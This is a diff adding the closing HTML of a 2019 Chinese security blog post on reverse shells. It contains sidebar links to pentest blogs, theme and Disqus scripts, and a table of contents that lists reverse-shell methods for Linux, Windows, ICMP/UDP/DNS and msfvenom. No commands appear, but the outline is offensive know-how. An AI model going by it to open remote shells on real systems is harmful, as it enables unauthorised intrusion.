+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">EkEk</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/JeremyEkEk" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:jeremy.0394@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/anbus/p/10046695.html" title="ArcticShell" target="_blank">ArcticShell</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/Micropoor/Micro8" title="Micropoor亮神" target="_blank">Micropoor亮神</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/zwjzqqb/article/list/7" title="VincentQB" target="_blank">VincentQB</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/PyxYuYu/MyBlog" title="PyxYuYu" target="_blank">PyxYuYu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://3gstudent.github.io/3gstudent.github.io/" title="三好学生" target="_blank">三好学生</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.inksec.cn/archives/page/2/" title="阿墨" target="_blank">阿墨</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.barradell-johns.com/" title="JACK" target="_blank">JACK</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://adsecurity.org/" title="AD安全" target="_blank">AD安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.fuzzysecurity.com" title="FuzzySecurity" target="_blank">FuzzySecurity</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.hexacorn.com/" title="Hexacorn" target="_blank">Hexacorn</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://evi1cg.me/" title="Evi1cg" target="_blank">Evi1cg</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://b404.xyz/" title="Jirairya" target="_blank">Jirairya</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://payloads.online/" title="倾旋" target="_blank">倾旋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://times0ng.github.io/" title="Times0g" target="_blank">Times0g</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://firstlove2016.cn/" title="初恋的技术分享" target="_blank">初恋的技术分享</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://422926799.github.io/" title="九世" target="_blank">九世</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.netwrix.com/" title="netwrix" target="_blank">netwrix</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://klionsec.github.io/" title="klion" target="_blank">klion</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://jivoi.github.io/archive/" title="EK" target="_blank">EK</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://securityer.lofter.com/view" title="走过岁月" target="_blank">走过岁月</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.webbaozi.com/" title="baozi" target="_blank">baozi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.myh0st.cn/" title="信安之路" target="_blank">信安之路</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jdrops.dropsec.xyz/" title="Jdrops" target="_blank">Jdrops</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://exploit.kitploit.com/" title="exploit collector" target="_blank">exploit collector</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zjw.dropsec.xyz/" title="Hello_C" target="_blank">Hello_C</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cxsecurity.com/dorks" title="cxsecurity" target="_blank">cxsecurity</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://pentest.blog/" title="pentest" target="_blank">pentest</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://rcoil.me/" title="rcoil" target="_blank">rcoil</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://dayu.ink/" title="Dayu" target="_blank">Dayu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://04z.net/" title="04z" target="_blank">04z</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.attackdebris.com/" title="attsckdebris" target="_blank">attsckdebris</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一、参考文章"><span class="nav-text">一、参考文章</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二、Linux下反弹shell"><span class="nav-text">二、Linux下反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用perl的socket"><span class="nav-text">利用perl的socket</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用系统特殊设备文件"><span class="nav-text">利用系统特殊设备文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用sshd"><span class="nav-text">利用sshd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#普通nc反弹"><span class="nav-text">普通nc反弹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完全版nc反弹"><span class="nav-text">完全版nc反弹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#加密nc反弹"><span class="nav-text">加密nc反弹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用awk-gawk"><span class="nav-text">利用awk/gawk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用telent客户端"><span class="nav-text">利用telent客户端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用python"><span class="nav-text">利用python</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用crontab定时反弹"><span class="nav-text">利用crontab定时反弹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用php的socket"><span class="nav-text">利用php的socket</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用java"><span class="nav-text">利用java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用ruby的socket"><span class="nav-text">利用ruby的socket</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用lua的socket"><span class="nav-text">利用lua的socket</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用nodejs"><span class="nav-text">利用nodejs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用c版的reverse-shell"><span class="nav-text">利用c版的reverse_shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用gcc反弹shell"><span class="nav-text">利用gcc反弹shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#三、基于不同协议下的shell反弹方式"><span class="nav-text">三、基于不同协议下的shell反弹方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用icmp"><span class="nav-text">利用icmp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用udp"><span class="nav-text">利用udp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用dns"><span class="nav-text">利用dns</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#四、win平台反弹shell"><span class="nav-text">四、win平台反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用powershell"><span class="nav-text">利用powershell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用nishang"><span class="nav-text">利用nishang</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#五、Metasploit的msfvenom"><span class="nav-text">五、Metasploit的msfvenom</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#六、简单Shell转换交互式TTY"><span class="nav-text">六、简单Shell转换交互式TTY</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用Python的pty"><span class="nav-text">利用Python的pty</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#七、总结"><span class="nav-text">七、总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EkEk</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://jeremyekek-github-io.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://jeremyekek.github.io/2019/06/01/反弹shell/';
+          this.page.identifier = '2019/06/01/反弹shell/';
+          this.page.title = '反弹shell';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://jeremyekek-github-io.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
